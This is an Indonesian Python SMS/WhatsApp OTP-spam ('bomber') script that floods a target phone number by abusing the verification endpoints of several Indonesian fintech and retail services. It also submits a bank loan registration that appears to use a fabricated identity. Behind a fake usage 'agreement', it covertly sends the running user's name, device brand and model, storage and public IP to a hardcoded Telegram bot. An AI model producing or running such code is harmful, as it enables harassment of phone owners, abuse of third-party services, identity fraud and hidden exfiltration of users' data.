import os,sys,time,os,json,requests,json
from colorama import Fore,Back,init,Style
from requests import get,post
from urllib import request
import requests
import time
from datetime import datetime
import subprocess
import os,sys,time,os,json,requests,json
from colorama import Fore,Back,init,Style
from requests import get,post
from urllib import request
import requests
import time
from datetime import datetime

import os, sys, time, json, requests
from colorama import Fore, Style
from urllib import request
import platform
import shutil
import socket
from datetime import datetime

def autoketik(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.008)

B = Fore.BLUE
C = Fore.CYAN
BR = Style.BRIGHT
W = Fore.WHITE
R = Fore.RED
G = Fore.GREEN
BL = Fore.BLACK
Y = Fore.YELLOW

localtime = time.asctime(time.localtime(time.time()))

hijau="\033[1;92m "
putih="\033[1;97m"
abu="\033[1;90m"
kuning="\033[1;93m"
ungu="\033[1;95m"
merah="\033[1;91m"
biru="\033[1;96m"

# Informasi Perangkat
merk_perangkat = subprocess.check_output(['getprop', 'ro.product.brand']).decode('utf-8').strip()
os_perangkat = subprocess.check_output(['getprop', 'ro.product.model']).decode('utf-8').strip()
total, used, free = shutil.disk_usage("/")
ip_address = ip=requests.get('https://api.ipify.org').text

info_penyimpanan = f"Total: {total // (2**30)} GB, Terpakai: {used // (2**30)} GB, Sisa: {free // (2**30)} GB"

# Konfigurasi bot Telegram
TELEGRAM_TOKEN = '7028070685:AAF5f39xs9t8yt63QYpe1DQy1rc5V92mVnY'
TELEGRAM_CHAT_ID = '7233342888'

def send_telegram_message(message):
    url = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage'
    data = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    }
    response = requests.post(url, data=data)
    return response

# Langkah 1: Minta Nama Pengguna
nama_pengguna = input("Siapa namamu: ")

# Langkah 2: Tampilkan Perjanjian
print("\n--- Perjanjian Penggunaan ---")
print("Dengan menggunakan skrip ini, kamu setuju untuk tidak menargetkan ke orang yang tidak bersalah, dan jangan menggunakan nomor orang lain untuk dijadikan test jika mau gunakan nomor sendiri!!, jika anda melarang perjanjian ini... yaa janji harus di tepati, ketik ya untuk setuju ketik tidak untuk tidak setuju !")
print("Apakah kamu setuju? (ya/tidak)")
persetujuan = input("> ").strip().lower()

# Langkah 3: Jika tidak setuju, kirim pesan ke bot Telegram dan blokir akses
if persetujuan != 'ya':
    message = f'✖️Pengguna {nama_pengguna} menolak perjanjian pada {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}.'
    send_telegram_message(message)
    print("Kamu tidak diizinkan menggunakan skrip ini.")
else:
    # Langkah 4: Jika setuju, kirim informasi perangkat dan waktu penggunaan ke bot Telegram
    waktu_penggunaan = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    device_info = (
        f'👤Pengguna: {nama_pengguna}\n'
        f'🕖Waktu Penggunaan: {waktu_penggunaan}\n'
        f'📱Merk Perangkat: {merk_perangkat}\n'
        f'📱Model: {os_perangkat}\n'
        f'🗄️Info Penyimpanan: {info_penyimpanan}\n'
        f'📲Alamat IP: {ip_address}'
    )
    send_telegram_message(device_info)
    print("-------")

    # Tempatkan kode skrip utama di sini
    print(f"Selamat datang, {nama_pengguna}! Kamu telah setuju dan sekarang dapat menggunakan skrip ini.")
    time.sleep(3)
    os.system('clear')
    print(f"TUNGGU SEBENTAR/")
    time.sleep(1)
    os.system('clear')
    print(f"TUNGGU SEBENTAR-")
    time.sleep(1)
    os.system('clear')
    print(f"TUNGGU SEBENTAR|")
    time.sleep(1)
    os.system('clear')
    print(f"TUNGGU SEBENTAR/")
    time.sleep(1)
    os.system('clear')
    print(f"TUNGGU SEBENTAR/")
    time.sleep(1)
    os.system('clear')
    print(f"TUNGGU SEBENTAR-")
    time.sleep(1)
    os.system('clear')
    print(f"TUNGGU SEBENTAR|")
    time.sleep(1)
    os.system('clear')
    print(f"TUNGGU SEBENTAR/")
    time.sleep(1)
    os.system('clear')
    print(f"TUNGGU SEBENTAR/")
    time.sleep(1)
    os.system('clear')
    print(f"TUNGGU SEBENTAR-")
    time.sleep(1)
    os.system('clear')
    print(f"TUNGGU SEBENTAR|")
    time.sleep(1)
    os.system('clear')
    print(f"TUNGGU SEBENTAR/")
    time.sleep(1)
    os.system('clear')
    print(f"TUNGGU SEBENTAR/")
    time.sleep(1)
    os.system('clear')
    print(f"TUNGGU SEBENTAR-")
    time.sleep(1)
    os.system('clear')
    print(f"TUNGGU SEBENTAR|")
    time.sleep(1)
    os.system('clear')
    print(f"Selesai!")
    
    
    # Lanjutkan dengan kode yang kamu inginkan...
    
os.system("clear")
autoketik(f"""
{BR}{R}
      __|                     
    \__ \   _ \   _` |   ` \  
    ____/  .__/ \__,_| _|_|_| 
          _|                  
{B}  \ \      /  |            |           \                 
   \ \ \  /     \    _` |   _| (_-<   _ \    _ \   _ \   
    \_/\_/   _| _| \__,_| \__| ___/ _/  _\  .__/  .__/   
                                           _|    _|      

{BR}{Y}[ {C}i{Y} ] {G} Script ini Delaynya Lama Banget
{W}[{Y}×{W}] Waktu/Jam ditempat mu{putih}:{Y} {localtime}  
{BR{B}Premium : {R} False
""")

nomor = input(f"{W}[{R}• {kuning}•{hijau}•{W}] {biru}Nomor Targetnya Ngab {W}: 62 ")
jum = 2
autoketik(f"{G}Memulai spam...   {W}Target :{Y}62"+nomor)
waktu_penggunaan = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
message = f"Pengguna {nama_pengguna} menggunakan skrip pada {waktu_penggunaan}.0"+nomor
send_telegram_message(message)
    

who = "https://h.kreditpintar.com/api/auth/send-code?channel=H5_GG_SD_1&lang=id"
whos = {
    "Host": "h.kreditpintar.com",
    "content-length": "46",
    "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
    "x-adv-market-channel": "H5_GG_SD_1",
    "x-user-agent": "Pintar-ID-Cash (WebAndroid;;;id) uuid/c4cb1e63-17ed-427f-a822-899f39c634cb version/0.1.0",
    "x-app-version": "APPVERSION_NAME(9999)",
    "accept-language": "id",
    "sec-ch-ua-mobile": "?1",
    "x-adv-uuid": "c4cb1e63-17ed-427f-a822-899f39c634cb",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "content-type": "application/json",
    "accept": "application/json, text/plain, */*",
    "sentry-trace": "023a27aa27f84e0b9e51193ff2d9d806-89e32e955945290e-0",
    "x-os-type": "WEB",
    "sec-ch-ua-platform": "Android",
    "origin": "https://h.kreditpintar.com",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://h.kreditpintar.com/H5_GG_SD_1/code-step?m=" + nomor,
    "accept-encoding": "gzip, deflate, br, zstd"
}
whox = {
  "mobileNumber":"+62" + nomor,
  "type":"SMS"
}

for i in range(jum):
            kpintar=requests.post(who, headers=whos, json=whox)
            ct = requests.post("https://bizapi.ginee.com/infra/common/security/send-otp",headers={"Host": "bizapi.ginee.com","content-length": "2025","accept-language": "id","sec-ch-ua-mobile": "?1","authorization": "","user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36","content-type": "application/json","accept": "application/json, text/plain, */*","sec-ch-ua-platform": "Android","origin": "https://ginee.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://ginee.com/id/lp/11/?utm_source=Googleads&utm_campaign=AA_Ginee_ID_WEB_NA_Click_CPA_Register_Manual_BrandExact_29052024_SYS_ERP&adgroup=BrandSpell&gad_source=1&gclid=Cj0KCQjwzby1BhCQARIsAJ_0t5NYI34kvXiA_fCy3zpZXIs1NYv2J14mAIAYfIN19VlysmR228VfrEgaAjq2EALw_wcB","accept-encoding": "gzip, deflate, br, zstd"},data=json.dumps({"account":nomor,"phoneCountry":"ID","verificationPurpose":"USER_REGISTRATION","verificationType":"PHONE","recaptchaToken":"03AFcWeA7EXVgpCcmEibjTmENv1YuygDx0Vp5A5kheYWPxq641IV9jDAIU52sdy6hZmrnpKz0le5whqUdIqUYf3jU87vPUmD_TcebOaFJbwmsKr21Rgi6m1vPrfDP9uyTwg-awyBK1zUUvSyIHyIc06FNFAeQADyyFs172jcqNmsdg2jLtBJwKPtLywpU-PoH87QpuQuJQWNDECtAeEPa5bXQrjBVRJw0bmRXtyBMa3DTx9PY9YkzeO70mQgWP0JMcRIdmSnvWDcNk4G3FxZ9g8E1YI6hCnSbRwI8oV3yCAKg1hKs-kbiP6gcatzs-Yf7uvebB4F6GkoPmk5xuUMQN1HYr9JwMAeJQAv1NGNYE8zijaqpQNEb-dcybTwh9nNYj5YN-Fbzz3mbdGqe_D5TLs6mpYA1Lq8lgUQU2Jisakpwscz4vUH1cymt7ZTLVLjvoWkhn-ZVKVOhE-4mJBc_rrG2yNYN79Pu15da5u3TilvssEdEcZcxrushMzkoKypYO1UsaOOQBJvgAT8_XLToo4deRX7RWaxpWXlb-T1dUTJSb-2WDmyp7kD59qnGe973C4ZZjRDzMevP7YEyoZA7EFvUCB80Qsxm540lmHEXKATwV_sL0i_-zUho1z8eUQySxr57qIX6ITodrqognLiE5evawCKy8l0Ae-dAbX0zGT7FdOjzs7BpxK1tpb4C3XjFUBPGkRBzNHUVF-2NApTLJlls3qcs5-nRyuHayi_ZFb3riQayV7KXufKIFdHD01PjBX4uUmV-Z67tqVCQT4CNfJSKL-UrCamQF-kEgDPQ4KYTOzuZygaigq4ce3DJ3OtwCXtjS_oj_QrhiUgLnc0DJLvUO6_4gh3BEgUX9t89sAtVTmGizRHbRFpG4TpKstDe1CAHnojGi08k_MVRRAG7X3o5hJjw-HES7DC4CRejgZdaH_cto2DlRhrAC5qcosWXH6GSKO_lQ3vekr4YKuKEM2CvywPKGcjKyLWcTaQugOXmpAN5DZL4_COF8Rzn-5BQvdxwoClzjAeQsTO_3E33mKM48AD4uxIuFoXPtgl0ILxe_oVTPuQ20J809SjzVEO_ssqqxrWxgDcbYLkN-0les80DU0xFppAt0ZAcUODeeWjgcz1SwDVQvjUhycxxz6L7Q7MoQmFR5WB2Sl7vardSIu09m3dW18rzJ3pc6GDCBzEBklVKQjGlg9O3V7S4TLgu5n8BH7cpvWaq39gHXs6t-j4ZEuNRef_F5QPzuv3Yc0QfNohglwJDmZDuTgnJDM3YMrVN8WkCf9EW9PszF_-WHE59D1Kp5j1LZUo86Sb1xTGwjrrjGM1KA3BkThqXreaIf4lpqk99BNEvg1Wk4NLAR3lm8rUmD0bMz4txm2SPW7IKIZ6LMEpUDDEHb3cKUYrtHSGp962F_gnYwuNtK3RvPLbsJIgtlhXjmKFHzPmjCADQ607kOENsLkh-mOhHIK2Z5gTfky7yhVE6ho62-xxniKMk4zvAYqpN10OppxnuEINtgG2H3SddTgiK8E1cD8T4--hNPGoH8-87l-CiDEzxJLvGo-yhvYeduGB4GpseXq58cxUab08fY_Um68fi53uiM1AtN80h90MwDUAZJZhbmOSr27KiISkCJa9Oqi38Qh6pJz24IEsjDq4bdv4t8Dp7SCxidKgHqZgcV6nMAoHaWUkXAVY-Vd8IhwRZpWqEeA7nsirh-leAoIW7fpO2AKhuyNEyCJK8juqpHwGOCvELyZxo0dghH5uPnRA-NT1QNMAoLIm1f_Utgfwy9a6ramuWPDNCOm89EHNbdZ4NSy7hqnhY2g2TA5fDZusx-WjqjNX7zFEJSf8sJeDBzPGnx4KkGQ2ZlL7XW8GGXnALf5ZBDVRoCc7hbaD0J8w"})).text
            astro=requests.post("https://api.astronauts.id/api/otp/generate_wa",headers={"Host": "api.astronauts.id","content-length": "24","x-device-version": "v2.0.29","x-api-version": "1.9.4","sec-ch-ua-mobile": "?1","authorization": "","access-control-max-age": "7200","content-type": "application/json","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36","x-device": "web-customer","sec-ch-ua-platform": '"Android"',"origin": "https://www.astronauts.id","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://www.astronauts.id/","accept-encoding": "gzip, deflate, br, zstd","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone":"0"+nomor})).text
            ctb=requests.post("https://eloan.ctbcbank.co.id/danacinta/cust/register/customer",headers={"Host": "eloan.ctbcbank.co.id","Connection": "keep-alive","Content-Length": "353","Cache-Control": "max-age=0","sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',"sec-ch-ua-platform": '"Android"',"sec-ch-ua-mobile": "?1","User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36","Content-Type": "application/json","Accept": "*/*","Origin": "https://eloan.ctbcbank.co.id","Sec-Fetch-Site": "same-origin","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Accept-Encoding": "gzip, deflate, br, zstd","Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"ktpName":"Muwani ireng","ktpId":"9165820977887889","dateOfBirth":"1988-01-09","email":"dixa83dixa9@gmail.com","mobilePhone":nomor,"areaCoverageCity":"Tangerang\r\n","isAgreePersonInfo":"1","isAgreeTncpp":"1","deviceId":None,"digitalCampaign":None,"gclid":None,"utmSource":None,"utmMedium":"homepage1","utmCampaign":None,"utmContent":None,"gacId":None})).text